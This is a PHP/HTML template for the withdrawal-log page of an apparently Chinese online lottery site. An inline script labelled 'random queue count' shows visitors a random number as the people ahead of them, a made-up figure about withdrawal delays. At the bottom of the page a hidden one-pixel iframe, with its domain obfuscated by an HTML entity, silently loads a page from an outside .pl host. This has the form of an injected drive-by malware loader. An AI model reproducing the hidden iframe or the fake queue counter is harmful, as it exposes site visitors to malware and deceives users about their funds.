<!DOCTYPE HTML>
<html>
<head>
<?php $this->display('inc_skin.php',0,''); ?>
</head> 
<body>
<?php $this->display('inc_header.php'); ?>
<div id="rightcon">
            <div class="wrapper bigbox">
<div class="page-wrapper">
    <?php $this->display('inc_left.php'); ?><div class="top_menu">
        <a href="<?= $this->basepath('Cash-rechargeLog') ?>">充值记录</a>
        <a class="act" href="<?= $this->basepath('Cash-toCashLog') ?>">提现记录</a>
        <a href="<?= $this->basepath('Cash-toCash') ?>">平台提现</a>
        <a href="<?= $this->basepath('Cash-recharge') ?>">自动充值</a>
    </div>
    <div class="page-info">
	  <div class="page_list">
        	<table><tr><td><p>提现正在处理中，，请稍候留意购彩资金！目前排队人数&nbsp;&nbsp;
			
<strong style="color:red;">
		<!--随机排队人数 by 千寻-->	
<script type="text/javascript">
<!--
var randnum;
randnum=Math.random();
while(randnum<0.1){
randnum=Math.random();
}
randnum=Math.floor(Math.random()*10);
document.write(randnum);
-->
</script>

</p></td></tr></table>
	  </div>
    </div>
</div>
</div>
</div><?php $this->display('inc_footer.php'); ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>